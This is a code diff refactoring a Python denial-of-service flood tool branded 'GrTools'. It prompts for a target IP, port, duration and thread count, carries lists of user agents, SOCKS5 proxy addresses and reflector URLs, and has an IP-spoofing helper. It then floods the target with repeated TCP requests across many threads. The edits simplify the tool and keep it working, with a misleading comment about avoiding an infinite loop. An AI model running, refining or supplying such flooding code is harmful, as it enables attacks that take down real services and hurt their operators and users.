@@ -1,33 +1,25 @@
 import socket
 import random
-import sys
 import datetime
-import ssl
-import http.client
 import threading
-import os
 import time
-from sys import stdout
 
 useragents = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',
     'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
     'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
-    # ...
 ]
 
 socks5 = [
     '221.211.62.6:1111',
     '8.210.48.101:18193',
     '120.79.53.184:1080',
-    # ...
 ]
 
 https = [
     'http://search.aol.com/aol/search?q=',
     'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
     'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
-    # ...
 ]
 
 def spoofer():
@@ -40,17 +32,15 @@ def spoofer():
     assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
     return assembled
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)
 
-ip = str(input("\033[36m╔══\n╚══════>Server@GrTools~ Enter Target IP : "))
+ip = input("\033[36m╔══\n╚══════>Server@GrTools~ Enter Target IP : ")
 port = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Port : "))
 t = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Times : "))
 th = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Thread : "))
-method = str(input("╔══\n╚══════>Server@GrTools~~ Enter Methods : "))
+method = input("╔══\n╚══════>Server@GrTools~~ Enter Methods : ")
 
-if method == "UDP" or method == "CPUKILL" or method == "TCP" or method == "ALL" or method == "REQ" or method == "CFREQ" or method == "SUBNET" or method == "CFSOC":
+if method == "TCP":
 
     def tcpfl():
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
@@ -74,20 +64,20 @@ if method == "UDP" or method == "CPUKILL" or method == "TCP" or method == "ALL" 
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.connect((ip, port))
-                sock.send(grtools)
-                sock.send(grtools)
-                sock.send(grtools)
-                sock.send(grtools)
-                for x in range(7500000):
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
+                for _ in range(150000):  # Reduce the number of iterations to avoid an infinite loop
                     sock.send(grtools)
                     sock.send(grtools)
                 sock.close()
+            except Exception as e:
+                print("Exception:", e)
 
-    for x in range(50000):
+    threads = []
+    for _ in range(th):
         if method == "TCP":
             t = threading.Thread(target=tcpfl)
-            print("[GrBroadcast] Successfully sent")
+            threads.append(t)
+            print("[GrBroadcast] Attacked")
             t.start()
+
+    for thread in threads:
+        thread.join()
